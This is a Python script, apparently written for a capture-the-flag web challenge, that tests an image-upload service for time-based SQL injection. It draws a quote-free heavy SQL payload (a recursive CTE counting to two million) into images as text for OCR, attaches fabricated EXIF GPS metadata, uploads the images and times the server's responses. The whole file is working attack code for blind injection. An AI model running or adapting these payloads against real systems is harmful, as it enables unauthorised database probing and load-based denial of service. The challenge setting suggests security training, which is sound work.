# v2_ocr_processing.py — summary_ocr is stored via bound param. But does the server run any SQL
# that USES the OCR text during processing (dedup check, count, existence)? Test with TIME-BASED:
# if the OCR text is put into a query somewhere in the pipeline, a heavy expression via char()
# (no quotes needed) makes the UPLOAD slow. Build the quote-free heavy payload with char(39).
import requests, base64, re, time
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open("paisaje.png").convert("RGB")

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=32):
    W=min(1700,max(1000,40+int(len(text)*size*0.58))); H=280
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save("op.jpg","jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"op.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("op.jpg","rb").read()).decode()

def timed(painted, desc):
    t=time.time()
    r=requests.post(f"{BASE}/upload", json={"image":build(painted),"description":desc,"user_id":UID})
    return round(time.time()-t,2), r.status_code

# quote-free heavy payload: build a string that, IF concatenated into a WHERE via ||, forces work
HEAVY = "||(SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<2000000) SELECT x FROM c))"
print("baseline plain :", timed("HELLOWORLD","OP_base"))
print("heavy via OCR  :", timed("z"+HEAVY,"OP_heavy"))
print("heavy 2        :", timed("z"+HEAVY+HEAVY,"OP_heavy2"))
print("\n(if heavy is much slower than baseline, the OCR text is used in a query during processing)")
